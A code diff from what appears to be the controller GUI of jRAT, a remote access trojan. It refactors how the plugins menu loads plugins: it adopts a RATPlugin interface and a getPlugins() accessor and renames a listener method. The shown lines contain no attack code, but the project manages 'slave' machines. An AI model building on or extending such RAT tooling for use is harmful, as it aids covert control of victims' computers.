@@ -23,6 +23,7 @@ import javax.swing.JTable;
 import javax.swing.event.ChangeEvent;
 import javax.swing.event.ChangeListener;
 
+import jrat.api.RATPlugin;
 import se.jrat.common.Version;
 import se.jrat.common.utils.DataUnits;
 import se.jrat.common.utils.IOUtils;
@@ -35,7 +36,6 @@ import se.jrat.controller.SampleMode;
 import se.jrat.controller.Slave;
 import se.jrat.controller.UniqueId;
 import se.jrat.controller.Updater;
-import se.jrat.controller.addons.Plugin;
 import se.jrat.controller.addons.PluginLoader;
 import se.jrat.controller.net.WebRequest;
 import se.jrat.controller.packets.outgoing.Packet11Disconnect;
@@ -769,18 +769,18 @@ public class Frame extends JFrame {
 		while (mnPlugins.getComponentCount() >= 4) {
 			mnPlugins.remove(4);
 		}
-		if (PluginLoader.plugins.size() == 0) {
+		if (PluginLoader.getPlugins().size() == 0) {
 			JMenuItem item = new JMenuItem("No plugins loaded");
 			item.setEnabled(false);
 			mnPlugins.add(item);
 		}
 
-		for (int i = 0; i < PluginLoader.plugins.size(); i++) {
-			final Plugin p = PluginLoader.plugins.get(i);
+		for (int i = 0; i < PluginLoader.getPlugins().size(); i++) {
+			final RATPlugin p = PluginLoader.getPlugins().get(i);
 
 			JMenuItem item = new JMenuItem(p.getName());
 
-			ActionListener listener = p.getGlobalItemListener();
+			ActionListener listener = p.getGlobalMenuItemListener();
 
 			if (listener != null) {
 				item.addActionListener(listener);
